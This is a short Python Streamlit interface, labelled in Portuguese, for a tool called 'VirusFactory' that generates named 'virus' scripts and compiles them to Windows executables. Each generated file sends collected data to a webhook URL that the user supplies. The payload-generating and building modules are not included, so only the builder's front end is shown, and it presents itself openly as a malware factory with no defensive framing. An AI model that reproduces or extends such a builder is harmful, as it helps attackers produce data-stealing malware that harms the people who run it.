import streamlit as st
from generator import generate_virus
from builder import build_exe

st.title("VirusFactory - Gerador de Vírus Profissional")
url = st.text_input("Webhook URL para receber dados:", value="https://webhook.site/")
name = st.text_input("Nome do vírus:", value="malware")

if st.button("Gerar Vírus"):
    generate_virus(url, name)
    st.success(f"Vírus '{name}.py' gerado!")

if st.button("Compilar para EXE"):
    build_exe(name)
    st.success(f"Arquivo '{name}.exe' compilado!")
